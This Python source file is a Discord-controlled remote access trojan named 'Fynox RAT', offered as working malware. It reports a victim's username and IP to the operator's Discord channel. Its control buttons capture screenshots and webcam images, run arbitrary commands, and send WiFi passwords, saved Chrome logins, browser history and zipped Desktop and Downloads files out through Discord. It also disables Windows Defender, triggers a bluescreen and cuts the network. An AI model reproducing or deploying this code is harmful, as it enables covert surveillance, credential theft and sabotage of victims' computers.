import discord
import socket
import platform
import psutil
import subprocess
import os
import json
import cv2
import numpy as np
import pyautogui
import requests
import sqlite3
import shutil
import zipfile
import datetime
import winsound
import ctypes
import win32gui
import win32con
import win32api
import win32process
import win32com.client
import win32net
import win32security
from discord.ext import commands
from discord.ext import tasks
from discord import app_commands
import asyncio

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

config_path = os.path.join(os.path.dirname(__file__), 'config.json')
with open(config_path, 'r') as f:
    config = json.load(f)

TOKEN = config['bot_token']
LOG_CHANNEL_ID = int(config['log_channel_id'])

@bot.event
async def on_ready():
    print(f"{bot.user} has connected to Discord!")
    
    channel = bot.get_channel(LOG_CHANNEL_ID)
    if channel:
        hostname = socket.gethostname()
        username = os.getlogin()
        
        # Get public IP using IPify
        try:
            response = requests.get('https://api.ipify.org?format=json')
            ip_data = response.json()
            public_ip = ip_data['ip']
        except:
            # Fallback to hostname IP
            public_ip = socket.gethostbyname(hostname)
        
        embed = discord.Embed(
            title="🔴 New Connection Established",
            description=f"**Username:** {username}\n**IP Address:** {public_ip}",
            color=discord.Color.red(),
            timestamp=datetime.datetime.now()
        )
        
        cpu_info = platform.processor()
        gpu_info = "Unknown"
        try:
            result = subprocess.run(['wmic', 'path', 'win32_VideoController', 'get', 'name'], 
                                  capture_output=True, text=True)
            gpu_info = result.stdout.split('\n')[1].strip()
        except:
            pass
            
        embed.add_field(name="CPU", value=cpu_info, inline=True)
        embed.add_field(name="GPU", value=gpu_info, inline=True)
        embed.add_field(name="Runtime", value=f"<t:{int(datetime.datetime.now().timestamp())}:R>", inline=False)
        embed.add_field(name="Commands", value="Use `!connect [IP]` command to access controls", inline=False)
        
        await channel.send(embed=embed)

@bot.command(name='connect')
async def connect(ctx, ip: str):
    if str(ctx.channel.id) != str(LOG_CHANNEL_ID):
        await ctx.send("This command can only be used in the log channel.")
        return
    
    hostname = socket.gethostname()
    username = os.getlogin()
    
    embed = discord.Embed(
        title="💀 Fynox RAT - System Information",
        description=f"**Username:** {username}\n**IP Address:** {ip}",
        color=discord.Color.dark_red(),
        timestamp=datetime.datetime.now()
    )
    
    cpu_info = platform.processor()
    gpu_info = "Unknown"
    try:
        result = subprocess.run(['wmic', 'path', 'win32_VideoController', 'get', 'name'], 
                              capture_output=True, text=True)
        gpu_info = result.stdout.split('\n')[1].strip()
    except:
        pass
    
    embed.add_field(name="CPU", value=cpu_info, inline=True)
    embed.add_field(name="GPU", value=gpu_info, inline=True)
    embed.add_field(name="Runtime", value=f"<t:{int(datetime.datetime.now().timestamp())}:R>", inline=False)
    
    view = ControlView(ctx.author.id)
    await ctx.send(embed=embed, view=view)

class ControlView(discord.ui.View):
    def __init__(self, author_id):
        super().__init__()
        self.author_id = author_id

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        return interaction.user.id == self.author_id

    @discord.ui.button(label="📸 Screenshot", style=discord.ButtonStyle.danger, row=0)
    async def screenshot(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        screenshots = []
        
        for i, monitor in enumerate(pyautogui.screens):
            screenshot = pyautogui.screenshot()
            screenshot_path = f"screenshot_{i}.png"
            screenshot.save(screenshot_path)
            screenshots.append(discord.File(screenshot_path))
        
        await interaction.followup.send(files=screenshots)
        
        for file in screenshots:
            os.remove(file.filename)

    @discord.ui.button(label="🎥 Video", style=discord.ButtonStyle.danger, row=0)
    async def video(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("Video recording started...")

    @discord.ui.button(label="📷 Webcam", style=discord.ButtonStyle.danger, row=0)
    async def webcam(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            cv2.imwrite("webcam.jpg", frame)
            await interaction.followup.send(file=discord.File("webcam.jpg"))
            os.remove("webcam.jpg")
        else:
            await interaction.followup.send("Webcam not found or in use.")

    @discord.ui.button(label="💻 Open CMD", style=discord.ButtonStyle.danger, row=1)
    async def open_cmd(self, interaction: discord.Interaction, button: discord.ui.Button):
        modal = CMDModal()
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="📝 Open Notepad", style=discord.ButtonStyle.danger, row=1)
    async def open_notepad(self, interaction: discord.Interaction, button: discord.ui.Button):
        subprocess.Popen(['notepad.exe'])
        await interaction.response.send_message("Notepad opened.")

    @discord.ui.button(label="🔄 Shutdown", style=discord.ButtonStyle.danger, row=1)
    async def shutdown(self, interaction: discord.Interaction, button: discord.ui.Button):
        subprocess.run(['shutdown', '/s', '/t', '0'])
        await interaction.response.send_message("System shutting down...")

    @discord.ui.button(label="💀 Bluescreen", style=discord.ButtonStyle.danger, row=2)
    async def bluescreen(self, interaction: discord.Interaction, button: discord.ui.Button):
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        await interaction.response.send_message("Triggering bluescreen...")

    @discord.ui.button(label="🔊 Play Sound", style=discord.ButtonStyle.danger, row=2)
    async def play_sound(self, interaction: discord.Interaction, button: discord.ui.Button):
        winsound.Beep(1000, 1000)
        winsound.Beep(500, 1000)
        winsound.Beep(2000, 1000)
        await interaction.response.send_message("Horror sound played.")

    @discord.ui.button(label="💥 Crash Discord", style=discord.ButtonStyle.danger, row=2)
    async def crash_discord(self, interaction: discord.Interaction, button: discord.ui.Button):
        for proc in psutil.process_iter(['pid', 'name']):
            if 'discord' in proc.info['name'].lower():
                proc.kill()
        await interaction.response.send_message("Discord crashed.")

    @discord.ui.button(label="🎮 Crash FiveM", style=discord.ButtonStyle.danger, row=3)
    async def crash_fivem(self, interaction: discord.Interaction, button: discord.ui.Button):
        for proc in psutil.process_iter(['pid', 'name']):
            if 'fivem' in proc.info['name'].lower():
                proc.kill()
        await interaction.response.send_message("FiveM crashed.")

    @discord.ui.button(label="🔥 CPU Bomber", style=discord.ButtonStyle.danger, row=3)
    async def cpu_bomber(self, interaction: discord.Interaction, button: discord.ui.Button):
        def stress_cpu():
            while True:
                [i**2 for i in range(100000)]
        
        import threading
        for _ in range(os.cpu_count()):
            threading.Thread(target=stress_cpu, daemon=True).start()
        
        await interaction.response.send_message("CPU bomber activated.")

    @discord.ui.button(label="🔒 Lock Screen", style=discord.ButtonStyle.danger, row=3)
    async def lock_screen(self, interaction: discord.Interaction, button: discord.ui.Button):
        ctypes.windll.user32.LockWorkStation()
        await interaction.response.send_message("Screen locked.")

    @discord.ui.button(label="🌐 Network Scanner", style=discord.ButtonStyle.danger, row=4)
    async def network_scanner(self, interaction: discord.Interaction, button: discord.ui.Button):
        result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
        await interaction.response.send_message(f"Network scan results:\n```{result.stdout}```")

    @discord.ui.button(label="🖱️ Teleport Mouse", style=discord.ButtonStyle.danger, row=4)
    async def teleport_mouse(self, interaction: discord.Interaction, button: discord.ui.Button):
        screen_width, screen_height = pyautogui.size()
        import random
        x = random.randint(0, screen_width)
        y = random.randint(0, screen_height)
        pyautogui.moveTo(x, y)
        await interaction.response.send_message(f"Mouse teleported to ({x}, {y})")

    @discord.ui.button(label="📶 Wifi Password", style=discord.ButtonStyle.danger, row=4)
    async def wifi_password(self, interaction: discord.Interaction, button: discord.ui.Button):
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
        profiles = [line.split(":")[1].strip() for line in result.stdout.split('\n') if "All User Profile" in line]
        
        passwords = []
        for profile in profiles:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if "Key Content" in line:
                    password = line.split(":")[1].strip()
                    passwords.append(f"{profile}: {password}")
        
        await interaction.response.send_message("WiFi passwords:\n```" + "\n".join(passwords) + "```")

    @discord.ui.button(label="🛡️ Disable Defender", style=discord.ButtonStyle.danger, row=5)
    async def disable_defender(self, interaction: discord.Interaction, button: discord.ui.Button):
        subprocess.run(['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'])
        await interaction.response.send_message("Windows Defender disabled.")

    @discord.ui.button(label="🌐 Kill Browsers", style=discord.ButtonStyle.danger, row=5)
    async def kill_browsers(self, interaction: discord.Interaction, button: discord.ui.Button):
        browsers = ['chrome.exe', 'firefox.exe', 'msedge.exe', 'iexplore.exe']
        for browser in browsers:
            subprocess.run(['taskkill', '/f', '/im', browser])
        await interaction.response.send_message("All browsers killed.")

    @discord.ui.button(label="💾 PC Dump", style=discord.ButtonStyle.danger, row=5)
    async def pc_dump(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        
        zip_name = "Fynox.zip"
        with zipfile.ZipFile(zip_name, 'w') as zipf:
            for folder in [os.path.expanduser('~\Desktop'), os.path.expanduser('~\Downloads')]:
                if os.path.exists(folder):
                    for root, dirs, files in os.walk(folder):
                        for file in files:
                            file_path = os.path.join(root, file)
                            zipf.write(file_path, os.path.relpath(file_path, folder))
        
        await interaction.followup.send(file=discord.File(zip_name))
        os.remove(zip_name)

    @discord.ui.button(label="🖥️ Shake Screen", style=discord.ButtonStyle.danger, row=6)
    async def shake_screen(self, interaction: discord.Interaction, button: discord.ui.Button):
        import threading
        import time
        import random
        
        def shake_screen_continuous():
            user32 = ctypes.windll.user32
            screen_width = user32.GetSystemMetrics(0)
            screen_height = user32.GetSystemMetrics(1)
            
            while True:
                # Move the entire screen by changing display settings
                try:
                    # Create shake effect by moving windows
                    def enum_windows_callback(hwnd, lParam):
                        if win32gui.IsWindowVisible(hwnd):
                            rect = win32gui.GetWindowRect(hwnd)
                            x, y, w, h = rect
                            offset_x = random.randint(-10, 10)
                            offset_y = random.randint(-10, 10)
                            win32gui.SetWindowPos(hwnd, win32con.HWND_TOP, x + offset_x, y + offset_y, w, h, win32con.SWP_NOSIZE)
                    
                    win32gui.EnumWindows(enum_windows_callback, None)
                    time.sleep(0.1)
                except:
                    # Fallback: shake mouse cursor
                    center_x = screen_width // 2
                    center_y = screen_height // 2
                    for dx, dy in [(5, 0), (-5, 0), (0, 5), (0, -5), (-5, -5), (5, 5), (-5, 5), (5, -5)]:
                        try:
                            user32.SetCursorPos(center_x + dx * 10, center_y + dy * 10)
                            time.sleep(0.05)
                        except:
                            pass
                time.sleep(0.05)
        
        # Start shaking in background thread
        shake_thread = threading.Thread(target=shake_screen_continuous, daemon=True)
        shake_thread.start()
        
        await interaction.response.send_message("🖥️ Screen shaking activated! The screen will continuously shake.")

    @discord.ui.button(label="📶 Internet Lag", style=discord.ButtonStyle.danger, row=7)
    async def internet_lag(self, interaction: discord.Interaction, button: discord.ui.Button):
        subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'admin=disable'])
        await asyncio.sleep(5)
        subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'admin=enable'])
        await interaction.response.send_message("Internet lag triggered.")

    @discord.ui.button(label="🚫 Disable Internet", style=discord.ButtonStyle.danger, row=7)
    async def disable_internet(self, interaction: discord.Interaction, button: discord.ui.Button):
        subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'admin=disable'])
        await interaction.response.send_message("Internet disabled.")

    @discord.ui.button(label="📖 Browser History", style=discord.ButtonStyle.danger, row=8)
    async def browser_history(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        
        history = []
        
        # Chrome
        try:
            chrome_path = os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History')
            if os.path.exists(chrome_path):
                shutil.copy2(chrome_path, 'chrome_history')
                conn = sqlite3.connect('chrome_history')
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls LIMIT 50")
                for row in cursor.fetchall():
                    history.append(f"Chrome: {row[0]} - {row[1]}")
                conn.close()
                os.remove('chrome_history')
        except:
            pass
        
        # Firefox
        try:
            firefox_path = os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox')
            for profile in os.listdir(firefox_path):
                if profile.endswith('.default'):
                    history_path = os.path.join(firefox_path, profile, 'places.sqlite')
                    if os.path.exists(history_path):
                        shutil.copy2(history_path, 'firefox_history')
                        conn = sqlite3.connect('firefox_history')
                        cursor = conn.cursor()
                        cursor.execute("SELECT url, title FROM moz_places LIMIT 50")
                        for row in cursor.fetchall():
                            history.append(f"Firefox: {row[0]} - {row[1]}")
                        conn.close()
                        os.remove('firefox_history')
        except:
            pass
        
        if history:
            with open('history.txt', 'w') as f:
                f.write('\n'.join(history))
            await interaction.followup.send(file=discord.File('history.txt'))
            os.remove('history.txt')
        else:
            await interaction.followup.send("No browser history found.")

    @discord.ui.button(label="💬 Message", style=discord.ButtonStyle.danger, row=8)
    async def message(self, interaction: discord.Interaction, button: discord.ui.Button):
        modal = MessageModal()
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="🔑 Password", style=discord.ButtonStyle.danger, row=8)
    async def password(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        
        passwords = []
        
        # Chrome passwords
        try:
            chrome_path = os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')
            if os.path.exists(chrome_path):
                shutil.copy2(chrome_path, 'chrome_passwords')
                conn = sqlite3.connect('chrome_passwords')
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    passwords.append(f"Chrome: {row[0]} - {row[1]}: {row[2]}")
                conn.close()
                os.remove('chrome_passwords')
        except:
            pass
        
        if passwords:
            with open('passwords.txt', 'w') as f:
                f.write('\n'.join(passwords))
            await interaction.followup.send(file=discord.File('passwords.txt'))
            os.remove('passwords.txt')
        else:
            await interaction.followup.send("No passwords found.")

class CMDModal(discord.ui.Modal, title="Open CMD"):
    count = discord.ui.TextInput(label="Number of CMD windows", placeholder="1")
    command = discord.ui.TextInput(label="Command to execute", placeholder="echo Hello World", required=False)

    async def on_submit(self, interaction: discord.Interaction):
        count = int(self.count.value)
        cmd_command = self.command.value or ""
        
        for _ in range(count):
            if cmd_command:
                subprocess.Popen(['cmd.exe', '/k', cmd_command])
            else:
                subprocess.Popen(['cmd.exe'])
        
        await interaction.response.send_message(f"Opened {count} CMD windows with command: {cmd_command}")

class MessageModal(discord.ui.Modal, title="Fynox sent a message"):
    message = discord.ui.TextInput(label="Message to display", placeholder="Enter your message here...")
    title = discord.ui.TextInput(label="Message title", placeholder="Fynox Alert")

    async def on_submit(self, interaction: discord.Interaction):
        import tkinter as tk
        from tkinter import messagebox
        
        root = tk.Tk()
        root.withdraw()
        messagebox.showwarning(self.title.value, self.message.value)
        root.destroy()
        
        await interaction.response.send_message("Message displayed on victim's PC.")

if __name__ == "__main__":
    bot.run(TOKEN)
